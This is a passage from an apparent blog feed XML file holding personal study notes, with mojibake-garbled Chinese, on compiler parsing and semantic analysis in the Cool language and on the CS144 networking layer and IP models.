| epsilon</p><p>LLå’ŒLRå·®å¼‚</p><p>ä»€ä¹ˆæ˜¯LL(1),æ˜¯è¯­è¨€è¿˜æ˜¯è§£æå™¨ï¼Ÿå…¶æ€§è´¨æ˜¯ä»€ä¹ˆï¼Œä»€ä¹ˆæ ·çš„æ–‡æ³•æ‰æ˜¯LL(1)</p><p>å¦‚ä½•é¿å…å·¦é€’å½’</p><p>åæ¬¡è¾¨è¯†ï¼šè¯­è¨€ï¼Œè¯­æ³•ï¼Œproductionï¼Œ itemï¼Œviableprefixï¼Œhandleï¼Œè§£æå™¨</p><p>LL1æŒ‡çš„æ˜¯æ–‡æ³•</p><p>language:</p><p>grammar</p><p>Production:</p><p>Handle:å¥æŸ„ï¼ˆhandleï¼‰æ˜¯ä¸€ä¸ªæ¥è‡ªç¼–è¯‘åŸç†çš„æœ¯è¯­ï¼ŒæŒ‡çš„æ˜¯ä¸€ä¸ªå¥å­ä¸­æœ€å…ˆè¢«è§„çº¦çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥å¸¦æœ‰ä¸€ä¸ªã€Œå¥ã€å­—ã€‚</p><p>Viable prefix:</p><p>Parser:</p><p>Item:</p><p><a href="https://www.zhihu.com/question/20607178">(2 å°ç§ä¿¡ / 34æ¡æ¶ˆæ¯) è¿è¡Œæ—¶ï¼ˆruntimeï¼‰æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿåº”è¯¥æ€æ ·æ·±å…¥ä¸”ç›´è§‚åœ°ç†è§£ï¼Ÿ - çŸ¥ä¹(zhihu.com)</a></p><p>è¿è¡Œæ—¶åº“ä¸ä»…åŒ…å«includeçš„ï¼Œä¹ŸåŒ…å«ç¼–è¯‘å™¨è‡ªåŠ¨æ’å…¥çš„ï¼›</p><p>https://zhuanlan.zhihu.com/p/71718231</p>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 4 Parsing Analysis 2 (LR Analysis)</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%9B%9B/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<p>WIP</p>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Network-CS144 ã® 1 Introduction</title>
    <link href="/emocoder/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%80/"/>
    <url>/emocoder/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>ç½‘ç»œåº”ç”¨ï¼š</p><ul><li>åŸºäºç½‘ç»œè¯»å–å’Œå†™æ•°æ®</li><li>å¸¸è§é€šä¿¡æ¨¡å‹ï¼šåŒå‘çš„å¯é çš„å­—èŠ‚æµï¼ˆä¸ºä»€ä¹ˆæ˜¯å­—èŠ‚æµï¼‰<ul><li>é€šä¿¡åŒæ–¹ä¸€è¾¹å†™å…¥æ•°æ®ï¼Œä¸€å˜è¯»å–æ•°æ®</li><li>å¯é çš„ï¼ˆé™¤éè¿æ¥ä¸­æ–­ï¼‰</li></ul></li></ul><h2 id="å››å±‚ç½‘ç»œæ¨¡å‹">å››å±‚ç½‘ç»œæ¨¡å‹</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>. Application<br><span class="hljs-number">2</span>. Transport<br><span class="hljs-number">3</span>. Networkï¼š[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> æ•°æ®ç»„ç»‡å½¢å¼ï¼šPacket, Linkå±‚ï¼Œæ˜¯åœ¨è·¯ç”±ä¹‹é—´çš„æ•°æ®ä¼ é€’ï¼Œ<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> ä»¥å¤ªç½‘<br><br><br>=&gt; Rout<span class="hljs-symbol">er:</span> è·¯ç”±ä»é“¾è·¯å±‚è§£æç½‘ç»œå±‚çš„æ•°æ®ï¼Œè·å–targetï¼Œæ ¹æ®è·¯ç”±è½¬å‘æ ‡å¯»æ‰¾ä¸‹ä¸€è·³ï¼ŒåŒ…è£…å¥½åå½¢æˆæ–°çš„Linkæ•°æ®åŒ…ï¼Œç»§ç»­è½¬å‘<br><span class="hljs-number">3</span>. Networkï¼š[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> æ•°æ®ç»„ç»‡å½¢å¼ï¼šPacket, Linkå±‚ï¼Œæ˜¯åœ¨è·¯ç”±ä¹‹é—´çš„æ•°æ®ä¼ é€’ï¼Œ<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> ä»¥å¤ªç½‘<br><br><br>=&gt; Rout<span class="hljs-symbol">er:</span> è·¯ç”±ä»é“¾è·¯å±‚è§£æç½‘ç»œå±‚çš„æ•°æ®ï¼Œè·å–targetï¼Œæ ¹æ®è·¯ç”±è½¬å‘æ ‡å¯»æ‰¾ä¸‹ä¸€è·³ï¼ŒåŒ…è£…å¥½åå½¢æˆæ–°çš„Linkæ•°æ®åŒ…ï¼Œç»§ç»­è½¬å‘<br><span class="hljs-number">3</span>. Networkï¼š[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> æ•°æ®ç»„ç»‡å½¢å¼ï¼šPacket, Linkå±‚ï¼Œæ˜¯åœ¨è·¯ç”±ä¹‹é—´çš„æ•°æ®ä¼ é€’ï¼Œ<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> ä»¥å¤ªç½‘<br><br><br>=&gt;<br><span class="hljs-number">1</span>. Application<br><span class="hljs-number">2</span>. Transport<br><span class="hljs-number">3</span>. Networkï¼š[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> æ•°æ®ç»„ç»‡å½¢å¼ï¼šPacket, Linkå±‚ï¼Œæ˜¯åœ¨è·¯ç”±ä¹‹é—´çš„æ•°æ®ä¼ é€’ï¼Œ<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> ä»¥å¤ªç½‘<br></code></pre></td></tr></table></figure><p>ç½‘ç»œå±‚æ˜¯ç‰¹æ®Šçš„ï¼šå› ä¸ºå¿…é¡»è¦ä½¿ç”¨ <code>Internet Protocol</code></p><ul><li>IPå°½æœ€å¤§åŠªåŠ›è½¬å‘æ•°æ®æŠ¥ï¼Œä½†æ˜¯ä¸èƒ½ä¿è¯</li><li>IPæ•°æ®æŠ¥å¯èƒ½ä¼šä¸¢å¤±ï¼Œä¼šæ— éœ€ï¼Œä¼šæŸåï¼Œè¿™äº›éƒ½æ˜¯æ²¡åŠæ³•ä¿è¯çš„</li></ul><p>IPæ˜¯æœ€é‡è¦çš„ï¼ŒIPæ˜¯ç˜¦èº«å±‚ï¼Œå› ä¸ºå…¶ä»–åè®®éƒ½æœ‰å¾ˆå¤šç§ç±»ï¼Œ<strong>ä½†æ˜¯IPå°±ä¸€ç§ï¼Œä¸ºä»€ä¹ˆå‘¢</strong>ï¼Ÿ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>, smtp, ssh, ftp<br><span class="hljs-attribute">tcp</span>, udp, rtp<br><span class="hljs-attribute">IP</span><br><span class="hljs-attribute">Ethernet</span> Wifi DSL <span class="hljs-number">3</span>G <span class="hljs-number">5</span>G<br></code></pre></td></tr></table></figure><p>ä¼ è¾“å±‚ï¼š</p><ul><li>TCPï¼šè™½ç„¶IPä¸ä¿è¯ï¼Œä½†æ˜¯TCPä¿è¯</li><li>UDP</li></ul><p>ä¸ƒå±‚OSIæ¨¡å‹ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Application</span> <span class="hljs-operator">=</span>&lt; http<br><span class="hljs-attribute">Presention</span> <span class="hljs-operator">=</span>&gt; ASCII<br><span class="hljs-attribute">Session</span> <span class="hljs-operator">=</span>&gt; TCP<br><span class="hljs-attribute">Transport</span> <span class="hljs-operator">=</span>&gt; TCP<br><span class="hljs-attribute">Network</span> <span class="hljs-operator">=</span>&gt; IP<br><span class="hljs-attribute">Link</span>    <span class="hljs-operator">=</span>&gt; Link<br><span class="hljs-attribute">Physical</span> <span class="hljs-operator">=</span>&gt; Link<br></code></pre></td></tr></table></figure><p>IPæ¨¡å‹ï¼š</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">Application<br>Transport: <span class="hljs-meta">[</span><span class="hljs-built_in">Data</span><span class="hljs-meta">]</span><span class="hljs-meta">[</span><span class="hljs-keyword">Header</span><span class="hljs-meta">]</span><br>Network    <span class="hljs-meta">[</span>   IP <span class="hljs-built_in">Data</span>  <span class="hljs-meta">]</span><span class="hljs-meta">[</span>IP <span class="hljs-keyword">Header</span><span class="hljs-meta">]</span><br>Link   <span class="hljs-meta">[</span>   <span class="hljs-keyword">Link</span> <span class="hljs-built_in">Data</span>           <span class="hljs-meta">]</span><span class="hljs-meta">[</span><span class="hljs-keyword">Link</span> <span class="hljs-keyword">Header</span><span class="hljs-meta">]</span><br></code></pre></td></tr></table></figure><p>â€‹</p><table><thead><tr class="header"><th>æ€§è´¨</th><th>è¡Œä¸º</th></tr></thead><tbody><tr class="odd"><td>Datagram</td><td>ç‹¬ç«‹çš„è·¯ç”±åŒ…ï¼ŒåŒ…æ˜¯ä¸€è·³ä¸€è·³çš„è½¬å‘</td></tr><tr class="even"><td>ä¸å¯ä¿¡</td><td>åŒ…å¯èƒ½ä¼šä¸¢å¤±</td></tr><tr class="odd"><td>å°½åŠ›</td><td>å°½æœ€å¤§é‡Œäº¤ä»˜æ•°æ®</td></tr><tr class="even"><td>Connectionless</td><td>No per-flow stateï¼ˆè¿æ¥æ˜¯æ— çŠ¶æ€çš„ï¼‰ åŒ…å¯èƒ½ä¹±åº</td></tr></tbody></table><p>ä¸ºä»€ä¹ˆIPæ¨¡å‹å¦‚æ­¤ç®€å•ï¼Ÿ</p><ul><li>å¿«</li><li>ç«¯åˆ°ç«¯åŸåˆ™</li><li>æ›´æ–¹ä¾¿è‡ªå®šä¹‰åœ¨å…¶ä¸Šå°è£…ä¸€äº›å®šåˆ¶çš„åè®®ï¼ˆå¯ä¿¡çš„orä¸å¯ä¿¡çš„ï¼‰</li><li>å®ç°çš„ç®€å•ï¼Œèƒ½å¤Ÿé€‚ç”¨äºå„ç§é“¾è·¯å±‚åè®®</li></ul><p>IPæ¨¡å‹çš„ç‰¹ç‚¹ï¼š</p><ul><li>é˜²æ­¢å¾ªç¯è½¬å‘ï¼ˆå¥—å¨ƒï¼‰</li><li>å¦‚æœæ•°æ®å¤ªé•¿ï¼Œå°†ä¼šåˆ†å‰²æ•°æ®æŠ¥</li><li>ä½¿ç”¨checksumå‡å°‘é”™è¯¯åˆ†å‘çš„æœºä¼š</li><li>å…è®¸æ›´å¤šçš„IPç‰ˆæœ¬ï¼Œipv4, ipv6</li><li>å…è®¸è‡ªå®šä¹‰header</li></ul><p>Ipv4æ•°æ®æŠ¥æ ¼å¼ï¼šç½‘ä¸Šæœ‰è‡ªå·±æŸ¥</p><ul><li>version</li><li>header len</li><li>Toatl Packet len</li><li>Packet ID</li><li>flags</li><li>flags offset</li><li>TTL</li><li>protocol ID</li><li>checksum</li><li>src ip addr</li><li>dest ip addr</li><li>options</li><li>padding</li><li>Data</li></ul><p>æ•´ä½“æµç¨‹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Client =&gt;<span class="hljs-built_in"> Server </span>(<span class="hljs-literal">No</span>, ä¹ˆæœ‰ç›´æ¥è¿æ¥)ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡è·¯ç”±è½¬å‘<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">IP </span>addr: 171.67.76.157<br>TCP port: 80<br><br><br>Server:<span class="hljs-built_in"></span><br><span class="hljs-built_in">IP </span>addr: 128.148.252.129<br>TCP port: 56567<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">Client </span>=&gt; router1 =&gt; router2 =&gt; <span class="hljs-built_in"> Server </span>(<span class="hljs-literal">No</span>, ä¹ˆæœ‰ç›´æ¥è¿æ¥)ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡è·¯ç”±è½¬å‘ï¼Œæ¯ä¸ªè·¯ç”±é‡Œé¢éƒ½æœ‰è·¯ç”±è¡¨ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™ä»é»˜è®¤è·¯ç”±è½¬å‘<br></code></pre></td></tr></table></figure><h2 id="ç½‘ç»œä¸­çš„è®¾è®¡æ¨¡å¼">ç½‘ç»œä¸­çš„è®¾è®¡æ¨¡å¼</h2><h3 id="åˆ†ç»„äº¤æ¢åŸç†">åˆ†ç»„äº¤æ¢åŸç†</h3><p>å°†æ•°æ®åˆ‡å‰²æˆå°å—ï¼ˆPacketï¼‰</p><blockquote><p>Packet: A self-contained unit of data that carries infomation for itto reach its destination</p></blockquote><p>åˆ†åŒ…è½¬å‘(packetswitching)ï¼šæ¯ä¸ªåˆ°è¾¾çš„åŒ…éƒ½æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œå¦‚æœè¿™æ¡é“¾è·¯æ˜¯availbleçš„ï¼Œåˆ™æœç”¨ï¼›å¦åˆ™ç¼“å­˜æ•°æ®åŒ…åï¼Œç»§ç»­ç­‰å¾…ã€‚</p><p>åˆ†åŒ…è½¬å‘ç›¸å½“äºè®©è·¯ç”±è‡ªå·±å»åšè½¬å‘åŠ¨ä½œï¼Œå¯ä¸å¯ä»¥åœ¨æ¯ä¸ªPacketé‡Œæºå¸¦è½¬å‘ç›®çš„åœ°ä¿¡æ¯å‘¢ï¼Ÿå¯ä»¥çš„ï¼Œä½†æ˜¯è¿™ç§æ²¡æœ‰å¿…è¦ï¼Œå ç”¨äº†ä¸€å®šçš„æ•°æ®ï¼Œä»¥åŠå­˜åœ¨ä¸€å®šå®‰å…¨é—®é¢˜ï¼ˆä¼šè¢«è¯±å¯¼åˆ°ä¸å®‰å…¨çš„ç½‘ç»œï¼‰</p><p>åˆ†åŒ…è½¬å‘çš„å¥½å¤„ï¼š</p><ul><li>äº¤æ¢æœºä¸ºæ¯ä¸ªæ•°æ®åŒ…åšå•ç‹¬çš„æœ¬åœ°å†³ç­–ï¼Œä¸éœ€è¦åœ¨æ•°æ®åŒ…ä¸­æŒ‡æ˜è·¯ç”±</li><li>é«˜æ•ˆçš„é“¾è·¯å…±äº«</li><li>åˆ†åŒ…è½¬å‘ä¸éœ€è¦ä¸ºæ¯ä¸ªæµé‡ä¿å­˜è‡ªå·±çš„çŠ¶æ€ï¼Œæ¯ä¸ªåŒ…éƒ½æ˜¯è‡ªåŒ…å«çš„</li></ul><h3 id="åˆ†å±‚åŸåˆ™">åˆ†å±‚åŸåˆ™</h3><p>å°†å¤§ç³»ç»Ÿåˆ‡åˆ†æˆå¤šä¸ªç‹¬ç«‹åŠŸèƒ½çš„éƒ¨åˆ†</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">layer1</span> <span class="hljs-operator">=</span>&gt; layer2 <span class="hljs-operator">=</span>&gt; ... <span class="hljs-operator">=</span>&gt; layern<br></code></pre></td></tr></table></figure><p>å¥½å¤„ï¼š</p><ul><li>ç‹¬ç«‹</li><li>é¡ºåºé€šä¿¡ï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œä»ä¸‹åˆ°ä¸Šé€šä¿¡</li><li>ä¸Šå±‚ä¸ºä¸‹å±‚æä¾›å®šä¹‰å®Œæ•´çš„æœåŠ¡ï¼Œä¸éœ€è¦äº†è§£ä¸‹å±‚æ˜¯ä»€ä¹ˆ</li></ul><p>ä¸ºä»€ä¹ˆè¦åˆ†å±‚ï¼š</p><ul><li>Modularity</li><li>Well defined service</li><li>Reuse</li><li>Seperation of concerns</li><li>Continuous improvement</li></ul><h3 id="å°è£…åŸåˆ™">å°è£…åŸåˆ™</h3><p>Layer N data is payload to layer N - 1, eg:</p><ul><li>Http application payload in</li><li>a TCP transport segment in</li><li>an IP network packet in</li><li>a wifi link frame</li></ul><p>åˆ†å±‚çš„å¥½å¤„ï¼šEncapsulation Flexibility</p><p>Encapsulation allows you to layer recursively</p><p>VPN:</p><ul><li>HTTP application payload in</li><li>a TCP transport segment in</li><li>an IP network packet in</li><li>a secured TLS presentation message in</li><li>a TCP transport segment in</li><li>an IP network packet in</li><li>an Ethernet link frame</li></ul><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">[link, ip, tcp, tls, ip, tcp, http]<br><br><span class="hljs-keyword">to</span> <span class="hljs-keyword">next</span> hop <span class="hljs-keyword">to</span> vpn gateway, <span class="hljs-keyword">to</span> vpn gateway, <span class="hljs-keyword">to</span> vpn gateway, <span class="hljs-keyword">to</span> web <span class="hljs-built_in">server</span>, <span class="hljs-keyword">to</span> web <span class="hljs-built_in">server</span><br></code></pre></td></tr></table></figure><h2 id="å­—èŠ‚é¡ºåº">å­—èŠ‚é¡ºåº</h2><h2 id="ipv4-vs-ipv6">IPv4 vs IPv6</h2><h2 id="æœ€é•¿å‰ç¼€åŒ¹é…">æœ€é•¿å‰ç¼€åŒ¹é…</h2><h2 id="åœ°å€è§£æåè®®">åœ°å€è§£æåè®®</h2><h2 id="æ€»ç»“">æ€»ç»“</h2>]]></content>
    
    
    <categories>
      
      <category>è®¡ç®—æœºç½‘ç»œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç®—æœºç½‘ç»œï¼Œè®¡ç®—æœºåŸºç¡€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebAssemblyå…¥é—¨</title>
    <link href="/emocoder/2023/06/06/WebAssembly%E5%85%A5%E9%97%A8/"/>
    <url>/emocoder/2023/06/06/WebAssembly%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 5 Semantic Analysis</title>
    <link href="/emocoder/2023/06/04/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%94/"/>
    <url>/emocoder/2023/06/04/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h2 id="type-checking-rules-and-how-to-implement"><strong>Type CheckingRules and How to Implement ?</strong></h2><p>Cool type can be implemented in a single traversal over the AST</p><ul><li>Type environment is passed down the tree (From parent tochild)ï¼Œç¯å¢ƒè‡ªä¸Šè€Œä¸‹æ˜¯åœ¨ä¸æ–­æ‰©å¢çš„</li><li>Types are passed up the tree from (From child toparent)ï¼Œç±»å‹æ˜¯è‡ªåº•å‘ä¸Šæ¨å¯¼å’Œæ£€æŸ¥çš„</li></ul><p>ğŸŒ°ï¼š <span class="math display">\[\frac{O,M,C\vdash e_1:Int \quad O,M,C\vdash e_2:Int }{O,M,C\vdash e_1 +e_2:Int }\]</span></p><blockquote><p>Environment(Object, Method, Class),ç¯å¢ƒåŒ…æ‹¬å½“å‰å¯¹è±¡ï¼Œå½“å‰æ–¹æ³•åŠå½“å‰ç±»</p></blockquote><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">TypeCheck(Envirment, e1 + e2) = &#123;<br>T1 = TypeCheck(Envirment, e1)<br>T2 = TypeCheck(Envirment, e2)<br><span class="hljs-built_in">check </span>T1 == T2 == Int<br><span class="hljs-built_in">return </span>Int<br>&#125;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š <span class="math display">\[\begin{equation}\begin{aligned}\frac{O,M,C\vdash e_0:T_0 \quadO[T/x],M,C\vdash e_1:T_1  \quadT_0 &lt;= T}{O,M,C\vdash e_1 + e_2:Int }\end{aligned}\end{equation}\]</span></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">TypeCheck(Envirment, <span class="hljs-params">let</span> <span class="hljs-params">x</span>: T &lt;- <span class="hljs-params">e0</span> <span class="hljs-params">in</span> <span class="hljs-params">e1</span>)</span> = &#123;<br>T0 = <span class="hljs-constructor">TypeCheck(Envirment, <span class="hljs-params">e0</span>)</span><br>T1 = <span class="hljs-constructor">TypeCheck(Envirment.<span class="hljs-params">add</span>(&#123;<span class="hljs-params">x</span>: T&#125;)</span>, e1)<br>check <span class="hljs-constructor">SubType(T0, T)</span><br>return T1<br>&#125;<br><br>è‡ªä¸Šè€Œä¸‹ï¼Œenvironmentä¸æ–­æ‰©å¢ï¼Œè‡ªåº•å‘ä¸Šæ£€æŸ¥ç±»å‹<br></code></pre></td></tr></table></figure><h2 id="introduction-to-semantic-analysis">Introduction to SemanticAnalysis</h2><ul><li><p>Lexical analysis</p><ul><li>Detects inputs with illegal tokens</li></ul></li><li><p>Parsing</p><ul><li>Detects inputs with ill-formed parse trees</li></ul></li><li><p>Semantic analysis</p><ul><li>Last. Front end phase</li><li>Catched all remaining errors</li></ul></li></ul><p>Why do semantic analysis ?</p><ul><li>Parsing can't catch some errors</li><li><strong>Some langaguage constructs not context-free</strong></li></ul><blockquote><p><a href="https://www.zhihu.com/question/21833944">(2 å°ç§ä¿¡ / 25æ¡æ¶ˆæ¯) åº”è¯¥å¦‚ä½•ç†è§£ã€Œä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ã€ï¼Ÿ - çŸ¥ä¹ (zhihu.com)</a></p></blockquote><p>Semantic analysis will do ?</p><ul><li>All identifiers are declared</li><li>Type checking</li><li>Inheritance relationships checking</li><li>Classes defined ony once</li><li>Methods in a class defined only once</li><li>Reserved identifiers are not misused</li><li>...</li></ul><h2 id="é™æ€ä½œç”¨åŸŸ">é™æ€ä½œç”¨åŸŸ</h2><p>Matching static declarations with uses</p><ul><li>Important static analyisis step in most language</li><li>including COOL</li></ul><p>ğŸŒ°ï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">let</span> y: String &lt;- <span class="hljs-string">&quot;abc&quot;</span> <span class="hljs-keyword">in</span> y + <span class="hljs-number">3</span> <span class="hljs-comment">// åœ¨åé¢çš„è¯­å¥é‡Œyä¸ºstringç±»å‹</span><br><br><span class="hljs-keyword">let</span> y: <span class="hljs-built_in">Int</span> <span class="hljs-keyword">in</span> x + <span class="hljs-number">3</span> <span class="hljs-comment">// æ²¡æœ‰çœ‹åˆ°xçš„å®šä¹‰ï¼Œå°†ä¼šæŠ¥é”™</span><br></code></pre></td></tr></table></figure><blockquote><p>The scope of an identifier is the portion of a program in which thatidentifier is accessible</p></blockquote><p>è®¡ç®—æœºé¢†åŸŸé‡Œå˜é‡ä½œç”¨åŸŸæŒ‡çš„æ˜¯ç¨‹åºä¸­å˜é‡çš„èµ·ä½œç”¨(å¯ä»¥get)çš„ä¸€æ®µèŒƒå›´</p><p>ä¸åŒä½œç”¨åŸŸé‡Œå¯å­˜åœ¨åŒåå˜é‡ï¼ŒåŒä¸€ä¸ªä½œç”¨åŸŸä¸å¯å‡ºç°ä¸åŒåå˜é‡</p><p>ä¸€ä¸ªå˜é‡çš„ä½œç”¨åŸŸèŒƒå›´æ˜¯æœ‰é™çš„</p><p>è®¸å¤šè¯­è¨€éƒ½æ˜¯é™æ€ä½œç”¨åŸŸï¼š</p><p>ä½œç”¨åŸŸä»…ä»…ä¾èµ–ç¨‹åºæ–‡æœ¬ï¼Œæ ¹æ®å˜é‡åœ¨ç¨‹åºæ–‡æœ¬çš„ä½ç½®å†³å®šå˜é‡çš„ä½œç”¨åŸŸï¼Œæ²¡æœ‰ä»»ä½•è¿è¡Œæ—¶å†³å®šçš„è¡Œä¸ºï¼Œeg:Cool</p><p>åŠ¨æ€ä½œç”¨åŸŸï¼š</p><p>Lisp: Lisp has changed to mostly static scoping</p><p>Scope depends on execution of the program</p><p>ğŸŒ°ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs llvm">let <span class="hljs-keyword">x</span>: Int &lt;- <span class="hljs-number">0</span> in<br>&#123;<br><span class="hljs-keyword">x</span><span class="hljs-comment">; =&gt;&gt;&gt;&gt;&gt;&gt; 1</span><br>let <span class="hljs-keyword">x</span>: Int &lt;- <span class="hljs-number">1</span> in<br><span class="hljs-keyword">x</span><span class="hljs-comment">; =&gt;&gt;&gt;&gt; 2</span><br><span class="hljs-keyword">x</span><span class="hljs-comment">; =&gt;&gt;&gt;&gt;&gt;&gt; 1</span><br>&#125;<br><br>ä¸Šé¢<span class="hljs-number">1</span>å·<span class="hljs-keyword">x</span>å’Œ<span class="hljs-number">2</span>å·<span class="hljs-keyword">x</span>æ˜¯ä¸åŒçš„ä½œç”¨åŸŸé‡Œ<span class="hljs-keyword">x</span><br><br>åŠ¨æ€ä½œç”¨åŸŸé‡Œçš„å˜é‡æ€»æ˜¯æŒ‡å‘ç¦»å®ƒæœ€è¿‘çš„å˜é‡<br><br>g(y) <span class="hljs-operator">=</span> let a &lt;- <span class="hljs-number">4</span> in f(<span class="hljs-number">3</span>)<span class="hljs-comment">;</span><br>f(<span class="hljs-keyword">x</span>) <span class="hljs-operator">=</span> a <span class="hljs-operator">=</span>&gt;&gt;&gt;&gt;&gt; a <span class="hljs-operator">=</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>Cool identifier bindings are introduced by:</p><ul><li>Class declarations (introduce class names)</li><li>Method declarations (introduce method names)</li><li>Let declarations (introduce object id's)</li><li>Formal declarations (introduce object id's)</li><li>Attribute declarations (introduce object id's)</li><li>Case declarations (introduce object id's)</li></ul><p>Cool çš„æ ‡è¯†ç¬¦å¹¶ä¸éƒ½æ˜¯å…è®¸åµŒå¥—çš„</p><p>æ¯”å¦‚ç±»å®šä¹‰ä¸å…è®¸åµŒå¥—ï¼Œç±»åä½¿ç”¨å‰å¿…é¡»å®šä¹‰</p><h2 id="é™æ€ä½œç”¨åŸŸå®ç°ç¬¦å·è¡¨">é™æ€ä½œç”¨åŸŸå®ç°ï¼ˆç¬¦å·è¡¨ï¼‰</h2><p>Much of semantic analysis can be expressed as a recursive descent ofon an AST</p><ul><li>Before: Process an AST node n</li><li>Recurse: Process the children of n</li><li>After: Finish processing the AST node n</li></ul><p>When performing semantic analysis on a portion of the AST, we need toknow which identifiers are defined</p><p>å½“åœ¨ASTçš„æŸéƒ¨åˆ†ä¸Šæ‰§è¡Œè¯­ä¹‰åˆ†ææ—¶ï¼Œéœ€è¦çŸ¥é“å“ªäº›æ ‡è¯†ç¬¦å·²ç»è¢«å®šä¹‰äº†ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 